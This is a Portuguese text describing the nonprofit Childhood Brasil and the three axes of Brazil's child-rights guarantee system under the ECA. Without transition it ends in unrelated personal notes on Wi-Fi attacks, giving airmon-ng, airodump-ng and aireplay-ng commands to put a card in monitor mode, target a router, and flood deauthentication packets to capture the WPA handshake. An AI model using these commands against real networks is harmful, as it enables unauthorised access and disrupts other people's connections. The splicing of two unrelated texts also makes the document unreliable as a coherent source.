A Childhood Brasil é uma organização sem fins lucrativos que luta por uma infância livre de exploração e abuso sexual. Na prática, a organização auxilia empresas, governo e sociedade civil a entender a problemática e o seu papel neste contexto para que, ao final, todos desenvolvam ações integradas para proteger crianças e adolescentes.

A organização não realiza atendimento direto a vítimas que tenham sofrido a violência e a seus familiares. Nosso papel é gerar e disseminar conhecimento com foco na prevenção e no enfrentamento desta problemática.

De acordo com a nossa legislação vigente – Constituição Federal e o Estatuto da Criança e do Adolescente (ECA) – crianças e os adolescentes são “pessoas em condição peculiar de desenvolvimento” e devem ter prioridade absoluta nas políticas publicas.

Para garantir que os seus direitos não sejam ameaçados e violados, o ECA orienta sobre a criação de políticas públicas em todas as esferas do governo – União, estados, Distrito Federal e Municípios. Para isso, estimula a articulação de um sistema de vários atores para garantir essa proteção integral. Esse sistema é conhecido como o Sistema de Garantia de Direitos (SGD) e é divido em três eixos principais:

Promoção: Serviços e programas públicos governamentais e não governamentais (assistência social, educação, saúde, segurança, trabalho). São atores que promovem os direitos previstos em leis e as politicas publicas para garantia desses direitos.

Defesa: Cuida, cobra e pune pessoas e os órgãos públicos que devem fazer sua parte para garantir a defesa dos direitos de crianças e adolescentes em risco. Integram este eixo varas especializadas da infância, órgãos de segurança e polícia, Ministério Público, Centros de Defesa e Conselhos Tutelares.

Controle: Nesse eixo estão todos os que vigiam o cumprimento do ECA, tanto o controle formal, exercido pelos órgãos governamentais, como o que chamamos de controle social, exercido pela sociedade civil. É formado por conselhos de direitos, setoriais, as ongs, os empresários, imprensa, voluntários etc. Todos nós temos um papel fundamental para exercer para o controle social e para cobrar o funcionamento do sistema e cumprimento do ECA.

Como componentes de um “sistema” que deve funcionar em rede, esses três eixos precisam estar integrados e ativos em torno de um único objetivo: garantir os direitos da criança e do adolescente.




iwlist wlan scanning =pega meu endereço mac e meu canal
airmon-ng start wlan0 =modulo de monitoramento de pacotes, deixa a placa em modo de monitoramento
			para ter ctz que funcionou ifconfig e veja a nova interface criada
handshake = o aberto de mao ele é pego quando um nova conexao se inicia na rede 
airodump-ng mon0 --bssid MACQUEDESEJAPEGA --channel CANAL --write NOMEARQUIVO

aireplay-ng -0 100 -a ROTEADOR -c MEUPC INTERFACE/WLAN0MON











-- VAMOS DERRUBA PARA TENTA PEGA O HANDSHAKE